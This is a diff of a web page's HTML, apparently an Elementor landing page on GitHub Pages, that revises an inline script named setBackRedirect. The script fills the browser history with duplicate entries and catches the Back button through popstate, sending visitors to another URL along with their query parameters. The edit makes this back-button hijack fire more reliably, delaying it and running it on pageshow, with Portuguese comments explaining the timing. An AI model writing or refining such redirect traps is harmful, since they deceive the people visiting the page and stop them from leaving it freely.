@@ -491,14 +491,16 @@ img:is([sizes=auto i],[sizes^="auto," i]){contain-intrinsic-size:3000px 1500px}
 
   function setBackRedirect(url) {
     let urlBackRedirect = url;
-    urlBackRedirect = urlBackRedirect =
+    urlBackRedirect =
       urlBackRedirect.trim() +
       (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
       document.location.search.replace('?', '').toString();
 
-    history.pushState({}, '', location.href);
-    history.pushState({}, '', location.href);
-    history.pushState({}, '', location.href);
+    // Aguarda 100 milissegundos para o GitHub Pages terminar de processar a página
+    setTimeout(() => {
+      history.pushState({}, '', location.href);
+      history.pushState({}, '', location.href);
+    }, 100);
 
     window.addEventListener('popstate', () => {
       console.log('onpopstate', urlBackRedirect);
@@ -508,8 +510,11 @@ img:is([sizes=auto i],[sizes^="auto," i]){contain-intrinsic-size:3000px 1500px}
     });
   }
 
-  setBackRedirect(link);
-</script>			</div>
+  // Executa apenas quando a página estiver totalmente pronta e exibida
+  window.addEventListener('pageshow', () => {
+    setBackRedirect(link);
+  });
+</script>		</div>
 				</div>
 				<div class="elementor-element elementor-element-555a7cf elementor-widget elementor-widget-html" data-id="555a7cf" data-element_type="widget" data-e-type="widget" data-widget_type="html.default">
 				<div class="elementor-widget-container">
